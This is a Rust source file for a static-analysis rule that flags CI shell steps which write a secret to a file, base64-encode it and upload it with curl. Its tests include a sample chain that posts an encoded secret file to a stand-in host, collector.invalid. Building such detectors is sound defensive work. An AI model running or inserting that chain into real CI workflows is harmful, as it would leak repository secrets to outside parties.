//! A deliberately small, fail-closed witness for one CI shell step.
//! Matches literal file identities and expands only named step secret bindings.
//! This is static content analysis: no shell, expression, or network execution.
use regex::Regex;
use serde_json::Value;
use std::collections::{BTreeSet, HashMap};
use std::sync::LazyLock;

pub(crate) const FACT_ID: &str =
    "micro-behaviors/communications/http/upload::ci-secret-encoded-file-upload-flow";
pub(crate) struct Witness {
    pub(crate) secrets: BTreeSet<String>,
    pub(crate) source_path: String,
    pub(crate) encoded_path: String,
    pub(crate) destination: String,
}
#[allow(clippy::expect_used, reason = "the regex is a checked, fixed literal")]
static SECRET: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*\$\{\{\s*secrets\.[A-Za-z_][A-Za-z0-9_]*\s*\}\}\s*$")
        .expect("valid step secret binding regex")
});
#[allow(clippy::expect_used, reason = "the regex is a checked, fixed literal")]
static WRITE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^echo\s+"[A-Z_][A-Z0-9_]*=\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))"\s*(>>?)\s*(\S+)\s*$"#)
        .expect("valid secret file write regex")
});
#[allow(clippy::expect_used, reason = "the regex is a checked, fixed literal")]
static ENCODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^base64(?:\s+(?:-w\s*\d+|--wrap(?:=|\s+)\d+))?\s+(\S+)\s*>\s*(\S+)\s*$")
        .expect("valid base64 file encoding regex")
});
fn path(s: &str) -> Option<String> {
    let s = s.trim_matches(['\'', '"']);
    if s.is_empty()
        || s.bytes()
            .any(|b| b.is_ascii_whitespace() || b"$`;|&<>\\".contains(&b))
    {
        return None;
    }
    Some(s.to_string())
}

pub(crate) fn find(source: &str, env: &Value) -> Vec<Witness> {
    if source.len() > 64 * 1024 {
        return Vec::new();
    }
    let mut files: HashMap<String, BTreeSet<String>> = HashMap::new();
    let mut encoded: HashMap<String, (String, BTreeSet<String>)> = HashMap::new();
    let mut witnesses = Vec::new();
    for line in source.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(c) = WRITE.captures(line) {
            let Some(target) = path(&c[4]) else {
                files.clear();
                encoded.clear();
                continue;
            };
            encoded.remove(&target);
            let Some(var) = c.get(1).or_else(|| c.get(2)).map(|m| m.as_str()) else {
                files.clear();
                encoded.clear();
                continue;
            };
            if &c[3] == ">" {
                files.remove(&target);
            }
            if env
                .get(var)
                .and_then(Value::as_str)
                .is_some_and(|s| SECRET.is_match(s))
            {
                files.entry(target).or_default().insert(var.to_string());
            }
            continue;
        }
        if let Some(c) = ENCODE.captures(line) {
            if let (Some(input), Some(output)) = (path(&c[1]), path(&c[2])) {
                encoded.remove(&output);
                if input != output
                    && let Some(secrets) = files.get(&input)
                {
                    encoded.insert(output, (input, secrets.clone()));
                }
            } else {
                files.clear();
                encoded.clear();
            }
            continue;
        }
        let command = line.strip_suffix("|| true").unwrap_or(line).trim();
        if command.starts_with("curl ") && !command.contains([';', '`', '$', '\\']) {
            let words: Vec<&str> = command.split_ascii_whitespace().collect();
            let destination = words
                .iter()
                .copied()
                .map(|s| s.trim_matches(['\'', '"']))
                .find(|s| s.starts_with("https://") || s.starts_with("http://"));
            if words.iter().any(|s| matches!(*s, "-I" | "--head")) {
                continue;
            }
            let body = words.windows(2).find_map(|pair| {
                matches!(pair[0], "--data-binary" | "--data" | "-d").then_some(pair[1])
            });
            if let (Some(destination), Some(body)) = (destination, body)
                && let Some(body) = body.trim_matches(['\'', '"']).strip_prefix('@')
                && let Some(body) = path(body)
                && let Some((input, secrets)) = encoded.get(&body)
                && !secrets.is_empty()
            {
                witnesses.push(Witness {
                    secrets: secrets.clone(),
                    source_path: input.clone(),
                    encoded_path: body,
                    destination: destination.to_string(),
                });
            }
            continue;
        }
        // Unsupported commands/control flow can modify paths or variables.
        // Never join evidence across functions, branches, heredocs or writes.
        files.clear();
        encoded.clear();
    }
    witnesses
}

#[cfg(test)]
mod tests {
    use super::*;
    fn source() -> String {
        "echo \"TOKEN=${VALUE}\" > /tmp/plain\nbase64 -w0 /tmp/plain > /tmp/encoded\ncurl -s -X POST https://collector.invalid/receive --data-binary @/tmp/encoded || true\n".to_string()
    }
    fn env() -> Value {
        serde_json::json!({"VALUE":"${{ secrets.ANY_KEY }}"})
    }
    #[test]
    fn renamed_bound_chain() {
        let w = find(&source(), &env());
        assert_eq!(w.len(), 1);
        assert_eq!(w[0].source_path, "/tmp/plain");
    }
    #[test]
    fn unrelated_input_is_not_bound() {
        assert!(
            find(
                &source().replace("base64 -w0 /tmp/plain", "base64 -w0 /tmp/other"),
                &env()
            )
            .is_empty()
        );
    }
    #[test]
    fn unrelated_upload_is_not_bound() {
        assert!(find(&source().replace("@/tmp/encoded", "@/tmp/other"), &env()).is_empty());
    }
    #[test]
    fn ordinary_environment_is_not_secret() {
        assert!(find(&source(), &serde_json::json!({"VALUE":"ordinary"})).is_empty());
    }
    #[test]
    fn reset_on_unknown_modification() {
        assert!(find(&source().replace("base64", "rm /tmp/plain\nbase64"), &env()).is_empty());
    }
    #[test]
    fn reset_on_function_boundary() {
        assert!(find(&source().replace("base64", "}\nother() {\nbase64"), &env()).is_empty());
    }
    #[test]
    fn replaced_encoded_file_is_not_bound() {
        assert!(
            find(
                &source().replace(
                    "curl ",
                    "echo \"NOT_SECRET=${NOT_SECRET}\" > /tmp/encoded\ncurl "
                ),
                &env()
            )
            .is_empty()
        );
    }
}
